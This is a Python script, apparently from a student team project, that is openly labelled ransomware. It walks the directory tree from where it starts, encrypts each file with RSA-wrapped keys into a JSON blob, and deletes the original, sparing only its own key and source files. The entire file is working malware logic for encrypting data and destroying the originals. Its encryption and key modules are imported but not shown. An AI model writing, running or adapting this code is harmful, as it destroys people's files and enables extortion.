"""
@author: Team PEMDAS
"""

import os
import json
import rsa_key
import file_encryption as enc
from base64 import b64encode

# Global Constants
CONST_KEY_PUBLIC_PATH = "rsa_key_public.pem"
CONST_KEY_PRIVATE_PATH = "rsa_key_private.pem"
CONST_SRC_ENC = "file_encryption.py"
CONST_SRC_DEC = "file_decryption.py"
CONST_SRC_KEYGEN = "rsa_key.py"
CONST_SRC_RANSOMWARE = "ransomware.py"
CONST_SRC_CURE = "cure.py"
CONST_SRC_EXE_ENC = "ransomware.exe"
CONST_SRC_EXE_DEC = "cure.exe"
CONST_FOLDER_CACHE = "__pycache__"
CONST_FOLDER_BUILD = "build"

def main():
    # Simple prompt
    print("[!][!][!][!][!][!][!][!][!][!][!][!][!][!]")
    print("Say goodbye to all your files... mwahahaha")
    print("[!][!][!][!][!][!][!][!][!][!][!][!][!][!]")
    
    # Check for RSA keys if exist. Else generate.
    rsa_key.main()
    
    # Start walk (encrypt)
    walk_enc()

def walk_enc():
    # Begin file walk
    rootDir = "." # Root is where program starts
    exclude = [CONST_FOLDER_CACHE, CONST_FOLDER_BUILD]
    for dirName, subdirList, fileList in os.walk(rootDir):
        subdirList[:] = [d for d in subdirList if d not in exclude]
        # Get directory names for debugging
        print("[+] %s" % dirName)
        
        for file_name in fileList:
            
            # Contactenate file info into a path
            file_path = os.path.join(dirName, file_name)
            
            if ( not file_name in 
                [CONST_KEY_PUBLIC_PATH, 
                 CONST_KEY_PRIVATE_PATH,
                 CONST_SRC_ENC,
                 CONST_SRC_DEC,
                 CONST_SRC_KEYGEN,
                 CONST_SRC_RANSOMWARE,
                 CONST_SRC_CURE,
                 CONST_SRC_EXE_ENC,
                 CONST_SRC_EXE_DEC] ):
                    # Get file names for debugging
                    print("[*] %s" % file_path)

                    # Encrypt File
                    RSACipher, C, IV, tag, ext = enc.MyRSAEncrypt(file_path, CONST_KEY_PUBLIC_PATH)
                    
                    # Create JSON file
                    name, extension = os.path.splitext(file_name)
                    file_name_new = name + ".json"
                    file_path_new = os.path.join(dirName, file_name_new)
                    with open(file_path_new, "w") as file:
                        # Init json file data
                        file_data = {}
                        
                        # Load data into collection
                        file_data["RSACipher"] = b64encode(RSACipher).decode("utf-8")
                        file_data["C"] = b64encode(C).decode("utf-8")
                        file_data["IV"] = b64encode(IV).decode("utf-8")
                        file_data["tag"] = b64encode(tag).decode("utf-8")
                        file_data["ext"] = ext
                        
                        # Write data
                        json.dump(file_data, file, ensure_ascii = False)
                        file.close()
                    
                    # Delete original file
                    os.remove(file_path)
                    
if __name__ == "__main__": main()